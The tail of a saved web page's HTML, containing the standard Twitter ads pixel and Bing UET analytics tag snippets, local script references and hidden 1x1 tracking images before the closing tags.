<script type="text/javascript" id="">!function(d,e,f,a,b,c){d.twq||(a=d.twq=function(){a.exe?a.exe.apply(a,arguments):a.queue.push(arguments)},a.version="1.1",a.queue=[],b=e.createElement(f),b.async=!0,b.src="https://static.ads-twitter.com/uwt",c=e.getElementsByTagName(f)[0],c.parentNode.insertBefore(b,c))}(window,document,"script");twq("init","nw667");twq("track","PageView");</script><script type="text/javascript" id="" src="./files/js(3)"></script><script type="text/javascript" id="">(function(c,d,f,g,e){c[e]=c[e]||[];var h=function(){var b={ti:"56314742"};b.q=c[e];c[e]=new UET(b);c[e].push("pageLoad")};var a=d.createElement(f);a.src=g;a.async=1;a.onload=a.onreadystatechange=function(){var b=this.readyState;b&&"loaded"!==b&&"complete"!==b||(h(),a.onload=a.onreadystatechange=null)};d=d.getElementsByTagName(f)[0];d.parentNode.insertBefore(a,d)})(window,document,"script","//bat.bing.com/bat","uetq");</script><script type="text/javascript" id="" src="./files/conv"></script><img src="./files/adsct(2)" height="1" width="1" style="display: none;"><img src="./files/adsct(3)" height="1" width="1" style="display: none;">


</body></html>